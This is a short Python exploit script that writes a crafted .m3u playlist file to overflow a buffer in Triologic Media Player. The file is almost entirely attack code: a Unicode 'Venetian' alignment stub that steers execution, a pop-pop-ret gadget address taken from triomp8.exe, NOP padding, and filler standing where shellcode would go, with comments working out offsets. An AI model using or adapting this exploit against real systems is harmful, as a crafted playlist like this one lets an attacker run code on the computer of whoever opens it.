#!/usr/bin/python -w
 
filename="evil7.m3u"

#EBP: 0012B360
#Buffer: 0012BB55

#Hex:
#0012bb55 - 0012b360 = 7F5
#Decimal:
#1227605 - 1225568 = 2037

align = (
"\x55"                      #push EBP
"\x71"                      #Venetian Padding
"\x58"                      #pop EAX
"\x71"                      #Venetian Padding
"\x05\x20\x11"              #add eax,0x11002000  \
"\x71"                      #Venetian Padding     |> +300
"\x2d\x17\x11"              #sub eax,0x11001700  /
"\x71"                      #Venetian Padding
"\x50"                      #push EAX
"\x71"                      #Venetian Padding
"\xC3")                     #RETN

#The alignment takes our EIP 117 bytes into our buffer which means we need to add 117 bytes of NOPs so that our shellcode start
#right where EIP gets aligned to

#0x004100f2 : pop esi # pop ebx # ret 0x04 | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)

#Using "DD" --> 00440045 for some reason. But 'SS' stays in tact --> 00530053

buffer = "\x90"*536 + "\x41\x71" + "\xf2\x41" + align + "\x58"*117 + "H"*(5000 - 540 - len(align) - 117) 
 

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
